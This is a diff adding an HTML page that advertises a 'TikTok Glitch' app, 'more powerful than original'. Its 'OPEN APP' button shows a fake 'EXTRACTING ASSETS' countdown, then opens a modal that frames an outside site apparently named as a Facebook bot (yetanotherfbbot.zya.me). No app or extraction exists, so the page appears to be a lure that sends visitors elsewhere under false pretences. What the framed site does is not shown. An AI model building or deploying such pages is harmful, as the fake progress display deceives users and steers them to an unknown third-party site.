@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+ <html>
+ <head>
+	 <title>TikTok Glitch!</title>
+	 <meta charset="UTF-8"/>
+	 <link rel="stylesheet" href="" type="text/css"/>
+	   <meta name="description" content="A simple tiktok app but more powerful than original ">
+  <meta property="og:image" content="logo.gif">
+	 	    <meta name="viewport" content="width=device-width,height=device-height, initial-scale=1,user-scalable="no">
+	 	<link href="https://fonts.googleapis.com/css?family=Orbitron" rel="stylesheet"> 
+	 <style>
+	 /* Style the modal */
+.modal {
+  display: none; /* Hidden by default */
+  position: fixed;
+  z-index: 1;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  overflow: auto;
+  background-color: rgba(0, 0, 0, 0.5);
+}
+
+/* Modal content */
+.modal-content {
+/*  background-color: #fefefe; */
+//  margin: 15% auto;
+  //padding: 10px;
+  border: 1px solid transparent;
+  width: 100%;
+}
+fieldset {
+	margin-top: 10%;
+	 border: 3px solid green;
+	 border-radius: 5px;
+	 background-color: white;
+	 }
+	 
+	legend {
+	font-size: 20px;
+	 border: 3px solid green;
+	 border-radius: 5px;
+	 color: green;
+	 background-color: white;
+	}
+/* Close button */
+.close {
+  color: #aaa;
+  float: right;
+  font-size: 28px;
+  font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+  color: black;
+  text-decoration: none;
+  cursor: pointer;
+}
+	 body {
+  margin:0px;
+  
+}
+.id-card-wrapper {
+  height: 100vh;
+  width:100%;
+  background-color: #091214;
+ display: flex;
+
+}
+.id-card {
+  flex-basis: 100%;
+  max-width: 30em;
+  border: 1px solid rgb(97, 245, 245);
+  margin: auto;
+  color: #fff;
+  padding: 1em;
+  /*background-color: silver;*/
+  background-image: url('asits/bg.png');
+  background-repeat: no-repeat;
+  background-size: 100% 220px;
+  box-shadow: 0px 0px 3px 1px yellow, inset 0px 0px 3px 1px red;
+}
+
+.profile-row {
+  display: flex;
+}
+.profile-row .dp {
+  flex-basis: 33.3%;
+  position: relative;
+  margin: 24px;
+  align-self: center;
+}
+.profile-row .desc {
+  flex-basis: 66.6%;
+}
+
+.profile-row .dp img {
+  max-width: 100%;
+  border-radius: 50%;
+  display: block;
+  box-shadow: 0px 0px 4px 3px ;
+ /* box-shadow: 0px 0px 4px 3px #12a0a0;*/
+}
+.profile-row .desc {
+  padding: 1em;
+}
+
+.profile-row .dp .dp-arc-inner {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  border: 6px solid transparent;
+  border-top-color: yellow;
+  border-radius: 50%;
+  top: -6px;
+  left: -6px;
+
+  animation-duration: 2s;
+  animation-name: rotate-clock;
+  animation-iteration-count: infinite;
+  animation-timing-function: linear;
+}
+@keyframes rotate-clock {
+  from {
+    transform: rotate(0deg);
+  }
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+
+.profile-row .desc {
+  font-family: 'Orbitron', sans-serif;
+  /*color: #ecfcfb;*/
+  color: yellow;
+  text-shadow: 0px 0px 4px blue;
+  letter-spacing: 1px;
+}
+.profile-row .desc h1 {
+  margin: 0px;
+}
+ .myButton {
+	box-shadow:inset 0px 4px 0px 0px #dcecfb;
+	background:linear-gradient(to bottom, #bddbfa 5%, #80b5ea 100%);
+	background-color:#bddbfa;
+	border-radius:6px;
+	border:1px solid #84bbf3;
+	display:inline-block;
+	cursor:pointer;
+	color:red;
+	font-family:Courier New;
+	font-size:11px;
+	font-weight:bold;
+	padding:4px 14px;
+	text-decoration:none;
+	text-shadow:0px 1px 0px #528ecc;
+}
+.myButton:hover {
+	background:linear-gradient(to bottom, #80b5ea 5%, #bddbfa 100%);
+	background-color:#80b5ea;
+}
+.myButton:active {
+	position:relative;
+	top:1px;
+}
+a {
+text-decoration: none
+}
+</style>
+ <script>
+      // Generate a random nonce
+      function generateNonce(length) {
+        let result = "";
+        const characters =
+          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        const charactersLength = characters.length;
+        for (let i = 0; i < length; i++) {
+          result += characters.charAt(
+            Math.floor(Math.random() * charactersLength)
+          );
+        }
+        return result;
+      }
+
+      // Set the nonce for the script
+      const scriptElement = document.createElement("script");
+      scriptElement.setAttribute(
+        "src",
+        "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v12.0"
+      );
+      scriptElement.setAttribute("nonce", generateNonce(16)); // Set the nonce attribute
+
+      // Append the script element to the document
+      document.head.appendChild(scriptElement);
+    </script>
+ </head>
+	 <body>
+<div id="myModal" class="modal">
+  <div class="modal-content">
+    <span class="close">&times;</span>
+    
+    <center>
+    <!--
+    <fieldset><legend>Loaded Successfully </legend >
+    <img style="width:60px;height:60px;" src="logo.gif"></img>
+ <hr>
+ <a  href="app.html">!! Go to App !!</a>
+ <hr>
+ -->
+ <iframe src="http://yetanotherfbbot.zya.me/?i=1#" allowfullscreen></iframe>
+ <!--
+ <div id="fb-root"></div>
+      <div
+        class="fb-post"
+        data-href="https://www.facebook.com/61556251846264/posts/pfbid0TfYWcVXxCY6XXBkqoLUwmyj3wG9sntfD8vch6XTAAR9NgV8pYNQmfn3d3HCq1tkMl/"
+      ></div>
+ -->
+     </center>
+     </fieldset>
+  </div>
+</div>
+<div class="id-card-wrapper">
+  <div class="id-card">
+    <div class="profile-row">
+      <div class="dp">
+        <div class="dp-arc-outer"></div>
+   <!--     <div class="dp-arc-inner"></div> -->
+        <img src="logo.gif">
+      </div>
+      <center>
+      <div class="desc">
+        <h3 style="font-size:15px">TikTokGlitch</h3>
+        <p style="font-size:10px">By Rejard</p>
+         
+                       
+            <button id="countdownButton"  class="myButton" onclick="startCountdown()">OPEN APP</button>
+      </div>
+      </center>
+    </div>
+  </div>
+</div>
+<script>
+ function startCountdown() {
+  let button = document.getElementById("countdownButton");
+  let remainingTime = 6; 
+  button.disabled = true; 
+
+  let interval = setInterval(function() {
+    button.innerHTML = "EXTRACTING ASSETS<hr> Estimated Time: " + remainingTime + "s";
+    remainingTime--;
+
+
+    if (remainingTime < 0) {
+      clearInterval(interval);
+      button.innerHTML = "Meow🥴";
+      button.disabled = true; 
+    
+      let modal = document.getElementById("myModal");
+      modal.style.display = "block";
+      let closeBtn = document.getElementsByClassName("close")[0];
+
+button.addEventListener("click", function() {
+  modal.style.display = "block";
+});
+
+closeBtn.addEventListener("click", function() {
+  modal.style.display = "none";
+});
+
+window.addEventListener("click", function(event) {
+  if (event.target === modal) {
+    modal.style.display = "none";
+  }
+});
+    }
+  }, 1000);
+}
+</script>
+	 </body>
+ </html>
